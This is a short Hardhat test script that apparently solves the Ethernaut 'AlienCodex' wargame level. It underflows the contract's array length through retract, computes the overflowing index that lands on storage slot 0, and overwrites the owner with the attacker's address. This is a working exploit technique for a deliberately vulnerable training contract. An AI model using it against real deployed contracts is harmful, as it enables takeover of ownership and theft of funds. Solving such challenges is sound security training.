import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
const BN = BigNumber;

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`AlienCodex`);
  const challengeAddress = await createChallenge(
    `0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  let startIndex = ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001") // getting address of start of array in storage - notice this is in slot 1!
  let zeroIndex = BN.from(2).pow(256) // zero index w/ overflow
  let diff = zeroIndex.sub(startIndex) // required for overflow to index zero

  let newOwner = "0x"+"0".repeat(24)+(await eoa.getAddress()).substring(2,42)

  await challenge.connect(eoa).make_contact()
  await challenge.connect(eoa).retract()
  await challenge.connect(eoa).revise(diff,newOwner)

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
